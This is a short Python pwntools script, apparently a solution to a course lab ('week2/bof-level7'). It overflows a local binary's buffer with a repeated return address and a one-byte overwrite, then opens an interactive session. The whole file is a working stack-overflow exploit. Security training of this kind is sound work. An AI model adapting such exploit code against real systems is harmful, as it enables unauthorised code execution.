#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level7/bof-level7')

buffer = p32(0x080484fb)*(136/4) + "\x14"


p.sendline(buffer)
p.interactive()
